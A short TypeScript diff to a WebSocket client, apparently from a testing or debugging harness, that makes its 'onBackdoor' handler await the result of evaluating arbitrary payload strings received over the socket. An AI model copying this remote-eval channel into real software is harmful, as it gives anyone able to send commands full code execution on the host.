@@ -94,7 +94,7 @@ class WebSocketClient {
     }, timeout)
   }
 
-  onBackdoor(cmd: WebSocketCommand) {
+  async onBackdoor(cmd: WebSocketCommand) {
     if (!cmd.payload || !cmd.id) {
       return;
     }
@@ -110,7 +110,13 @@ class WebSocketClient {
     };
 
     try {
-      res.result = (0, eval)(cmd.payload);
+      const r = (0, eval)(cmd.payload);
+      if (r instanceof Promise || Object.getPrototypeOf(r).hasOwnProperty('then')) {
+        res.result = await r;
+      } else {
+        res.result = r;
+      }
+
     } catch (e: any) {
       res.error = e.toString();
     }
